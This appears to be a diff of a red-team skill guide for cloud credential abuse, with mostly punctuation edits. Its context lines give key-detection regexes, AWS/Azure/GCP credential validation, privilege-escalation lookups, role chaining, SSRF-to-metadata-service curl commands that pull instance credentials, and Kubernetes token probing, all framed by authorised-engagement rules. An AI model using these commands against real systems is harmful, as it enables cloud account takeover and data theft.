@@ -38,11 +38,11 @@ Trigger when:
 - APK / git-leak reveals embedded cloud key
 - Recon shows public S3/GCS/Azure-blob with permissions you can verify
 - A Kubernetes API or service-account token is exposed
-- Post-RCE on a cloud-hosted instance; pivot to cloud control plane
+- Post-RCE on a cloud-hosted instance — pivot to cloud control plane
 
 Do NOT use for:
-- On-prem-only environments (use AD attack skills; but those are out of scope per external-only boundary)
-- Web2 vulns that happen to be on AWS; use the relevant `hunt-*` skill
+- On-prem-only environments (use AD attack skills — but those are out of scope per external-only boundary)
+- Web2 vulns that happen to be on AWS — use the relevant `hunt-*` skill
 
 ---
 
@@ -61,7 +61,7 @@ AIDA[0-9A-Z]{16}                # IAM user (user-id)
 AROA[0-9A-Z]{16}                # IAM role
 ANPA[0-9A-Z]{16}                # Managed policy
 
-# AWS secret pattern (40-char base64-ish: context required)
+# AWS secret pattern (40-char base64-ish — context required)
 [A-Za-z0-9/+=]{40}              # AWS secret access key
 
 # Azure
@@ -76,13 +76,13 @@ client_secret pattern + UUID    # Azure AD app credential
   "private_key": "-----BEGIN PRIVATE KEY-----..."
 }
 
-# K8s SA token (JWT format: decode to confirm)
+# K8s SA token (JWT format — decode to confirm)
 eyJhbGciOiJSUzI1...     # decode iss claim to inspect the claimed issuer; decoding does not verify the signature
 ```
 
 ---
 
-## AWS: read-only validation (the safe first step)
+## AWS — read-only validation (the safe first step)
 
 ```bash
 # Set credential
@@ -95,7 +95,7 @@ aws sts get-caller-identity
 # Arn tells you: IAM user vs role, account ID, name
 
 # 2. WHAT can I do? (the privesc question)
-# Try common read-only first: failures still inform you
+# Try common read-only first — failures still inform you
 aws iam list-users 2>&1 | head -5
 aws iam list-roles 2>&1 | head -5
 aws iam list-policies 2>&1 | head -5
@@ -120,9 +120,9 @@ aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[0
 
 ---
 
-## AWS privesc patterns (24+ documented: `iam_privesc` techniques)
+## AWS privesc patterns (24+ documented — `iam_privesc` techniques)
 
-Quick lookup; if you have any of these IAM actions, escalate via the listed technique:
+Quick lookup — if you have any of these IAM actions, escalate via the listed technique:
 
 | You have | Escalate via |
 |---|---|
@@ -155,7 +155,7 @@ Many of the destructive ones are out-of-scope for an external red-team; document
 
 ---
 
-## AWS: STS / cross-account / role chaining
+## AWS — STS / cross-account / role chaining
 
 ```bash
 # Enumerate roles you can assume across accounts
@@ -183,14 +183,14 @@ aws sts get-caller-identity  # should now show OTHER_ACCT
 ## AWS IMDSv1 / IMDSv2 abuse via SSRF
 
 ```bash
-# IMDSv1 (legacy, still common: straight GET):
+# IMDSv1 (legacy, still common — straight GET):
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 # Returns role name → fetch creds:
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
 # JSON with AccessKeyId, SecretAccessKey, Token, Expiration
 
-# IMDSv2 (requires PUT to get a token first: usually mitigates SSRF):
+# IMDSv2 (requires PUT to get a token first — usually mitigates SSRF):
 curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
 TOKEN=...
 curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
@@ -202,7 +202,7 @@ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-da
 
 ---
 
-## Azure: credential validation
+## Azure — credential validation
 
 ```bash
 # Login with a credential
@@ -229,7 +229,7 @@ az vm list --output table
 
 ---
 
-## Azure: Managed Identity abuse
+## Azure — Managed Identity abuse
 
 ```bash
 # From inside Azure VM (post-RCE or SSRF to IMDS-equivalent):
@@ -268,7 +268,7 @@ curl -H "Metadata: true" \
 
 ---
 
-## GCP: service account JSON
+## GCP — service account JSON
 
 ```bash
 # Activate
@@ -279,7 +279,7 @@ gcloud auth list
 gcloud config get-value account
 gcloud config get-value project
 
-# What roles does this SA have? (project-level only: not org-level)
+# What roles does this SA have? (project-level only — not org-level)
 gcloud projects get-iam-policy <projectId> \
   --flatten="bindings[].members" \
   --format="table(bindings.role)" \
@@ -330,13 +330,13 @@ curl -H "Authorization: Bearer $TOKEN" \
 
 ---
 
-## Kubernetes: exposed API / SA token
+## Kubernetes — exposed API / SA token
 
 ```bash
 # Check anonymous access on K8s API
 curl -sk "https://k8s.target.com:6443/api/v1/namespaces"
 
-# Anonymous binding (system:anonymous user): surprisingly common
+# Anonymous binding (system:anonymous user) — surprisingly common
 curl -sk "https://k8s.target.com:6443/api/v1/pods?limit=1"
 
 # If SA token exfil'd (eyJ...):
@@ -385,24 +385,24 @@ kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-
 
 ## Anti-patterns
 
-- **DO NOT run write/delete operations without explicit OK**; IAM mutation is destructive and audit-visible
-- **DO NOT enumerate everything in scope of an account**; `aws iam list-users` against an account with 50,000 users is loud and slow
-- **DO NOT use `aws *` with non-test creds without confirming you have the right account**; accidentally hitting prod = career risk
-- **DO NOT confuse "I have the credential" with "this credential is current"**; always check expiration / rotation via STS first
-- **DO NOT assume an STS token from one account works across accounts**; region restrictions and trust policies apply
-- **DO NOT skip CloudTrail/Activity Log awareness**; logging coverage depends on service/event configuration and retention; pair with `mid-engagement-ir-detection`
-- **DO NOT pivot deeper than the SOW allows**; discovering admin creds doesn't mean using them; some engagements are read-only
+- **DO NOT run write/delete operations without explicit OK** — IAM mutation is destructive and audit-visible
+- **DO NOT enumerate everything in scope of an account** — `aws iam list-users` against an account with 50,000 users is loud and slow
+- **DO NOT use `aws *` with non-test creds without confirming you have the right account** — accidentally hitting prod = career risk
+- **DO NOT confuse "I have the credential" with "this credential is current"** — always check expiration / rotation via STS first
+- **DO NOT assume an STS token from one account works across accounts** — region restrictions and trust policies apply
+- **DO NOT skip CloudTrail/Activity Log awareness** — logging coverage depends on service/event configuration and retention; pair with `mid-engagement-ir-detection`
+- **DO NOT pivot deeper than the SOW allows** — discovering admin creds doesn't mean using them; some engagements are read-only
 
 ---
 
 ## Bridge to neighboring skills
 
-- `hunt-cloud-misconfig`; finds the credentials in the first place (public buckets, IMDS via SSRF, leaked JSON)
-- `hunt-ssrf`; SSRF→IMDS is the canonical chain into cloud control plane
-- `apk-redteam-pipeline`; APK secret extraction commonly yields cloud creds
-- `supply-chain-attack-recon`; CI/CD pipelines store cloud creds; finding them is a separate workflow
-- `m365-entra-attack`; Azure cross-product; Managed Identity tokens cross over to Graph
-- `mid-engagement-ir-detection`; cloud control plane activity is monitored; expect mitigations
+- `hunt-cloud-misconfig` — finds the credentials in the first place (public buckets, IMDS via SSRF, leaked JSON)
+- `hunt-ssrf` — SSRF→IMDS is the canonical chain into cloud control plane
+- `apk-redteam-pipeline` — APK secret extraction commonly yields cloud creds
+- `supply-chain-attack-recon` — CI/CD pipelines store cloud creds; finding them is a separate workflow
+- `m365-entra-attack` — Azure cross-product; Managed Identity tokens cross over to Graph
+- `mid-engagement-ir-detection` — cloud control plane activity is monitored; expect mitigations
 
 ---
 
@@ -415,18 +415,18 @@ kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-
 | Azure MI on internet-exposed VM with Owner role | Critical |
 | Leaked cred with read-only on prod data store | High (or Critical depending on data sensitivity) |
 | Leaked cred with privesc path but no admin yet | High |
-| Leaked cred; read access only to non-sensitive | Medium |
-| Anonymous public bucket; listing only | Low/Medium |
-| Anonymous bucket; write permission | High |
+| Leaked cred — read access only to non-sensitive | Medium |
+| Anonymous public bucket — listing only | Low/Medium |
+| Anonymous bucket — write permission | High |
 
 ---
 
 ## Cleanup discipline (deliverable hygiene)
 
 If during the engagement you:
-- Used `sts:AssumeRole` to chain; note the role names and times in IoCs
-- Created any IAM resources (test users, roles, policies); list them with explicit cleanup confirmation
-- Read sensitive data (Secrets Manager, KMS keys, Storage blob content); note in deliverable that data was viewed but not exfiltrated outside the engagement systems
+- Used `sts:AssumeRole` to chain — note the role names and times in IoCs
+- Created any IAM resources (test users, roles, policies) — list them with explicit cleanup confirmation
+- Read sensitive data (Secrets Manager, KMS keys, Storage blob content) — note in deliverable that data was viewed but not exfiltrated outside the engagement systems
 
 Cloud activity is trivially auditable; the client WILL find it post-engagement. Documenting now > getting blindsided later.
 
@@ -435,7 +435,7 @@ Cloud activity is trivially auditable; the client WILL find it post-engagement. 
 
 ## Contents
 
-- [AWS Cognito Identity Pool; Unauthenticated-Role Attack Chain (2024-2026 surface)](references/details.md)
+- [AWS Cognito Identity Pool — Unauthenticated-Role Attack Chain (2024-2026 surface)](references/details.md)
 - [Related Skills & Chains](references/details.md)
 
 ## Limitations
